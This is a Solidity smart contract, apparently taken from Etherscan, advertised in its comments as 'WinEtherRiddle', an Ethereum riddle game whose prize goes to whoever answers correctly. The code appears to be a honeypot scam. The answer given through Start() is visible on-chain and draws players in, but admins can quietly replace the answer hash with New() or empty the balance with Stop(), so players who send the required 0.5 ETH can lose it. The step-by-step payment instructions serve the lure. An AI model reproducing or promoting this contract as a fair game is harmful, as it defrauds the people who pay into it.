/**
 *Submitted for verification at Etherscan.io on 2023-06-03
*/

// SPDX-License-Identifier: MIT
/*
 *
 *  __      ___      ___ _   _            ___ _    _    _ _     
 *  \ \    / (_)_ _ | __| |_| |_  ___ _ _| _ (_)__| |__| | |___ 
 *   \ \/\/ /| | ' \| _||  _| ' \/ -_) '_|   / / _` / _` | / -_)
 *    \_/\_/ |_|_||_|___|\__|_||_\___|_| |_|_\_\__,_\__,_|_\___|
 *  
 *
 * Welcome to WinEtherRiddle, the Ethereum-based puzzle game where wit meets reward.
 * Our diligent admins post a fresh, challenging question, and here's where you step in.
 * Think, ponder and when ready, submit your answer along with a certain amount of Ether.
 * If your answer hits the bull's eye, the entire Ether balance of the contract is yours! 
 * But hold your breath, because with each round, the questions get a notch harder.
 * So, are you ready to join this exciting journey of mind-boggling riddles and bountiful
 * rewards?
 * 
 * How to Participate:
 * Step 1: Connect Your Ethereum Wallet.
 * Step 2: View the Riddle. This can be done by interacting with the contract on Etherscan.
 * Step 3: Submit Your Answer by calling the `Try` function. Remember, you need to send at
 *         least 0.5 ETH with your transaction to be eligible to win.
 * Step 4: Claim Your Reward. If your response is correct, the contract automatically transfers 
 *         the entire Ether balance to your wallet.
 * 
 * Here's how to do it using Etherscan:
 *
 *  1. Navigate to the contract's page on Etherscan.
 *  2. Under the "Contract" tab, click on "Read Contract".
 *  3. Locate the question field and click on it to to reveal the current question.
 *  4. Under the Contract tab, click on Write Contract.
 *  5. Connect your Ethereum wallet by clicking on Connect to Web3.
 *  6. Find the Try function in the list and enter your response into the _response field.
 *     Enter an amount of 0.5 Ether in the Value field.
 *  7. Click on Write to submit your answer. Confirm the transaction in your wallet.
 *
 * Please remember that all transactions on the Ethereum blockchain are final and cannot be reversed,
 * so always double-check your transactions before confirming them. Be careful and enjoy the riddle!
 *
 */

pragma solidity ^0.8;   

contract WinEtherRiddle
{

    string public question;
    bytes32 responseHash;
    mapping (address => bool) admin;

    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value >= 0.5 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function Start(string calldata _question, string calldata _response) public payable isAdmin
    {
        if(responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin
    {
        payable(msg.sender).transfer(address(this).balance);
        responseHash = 0x0;
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin
    {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(address[] memory admins)
    {
        for(uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin()
    {
        require(admin[msg.sender]);
        _;
    }

    fallback() external {}
}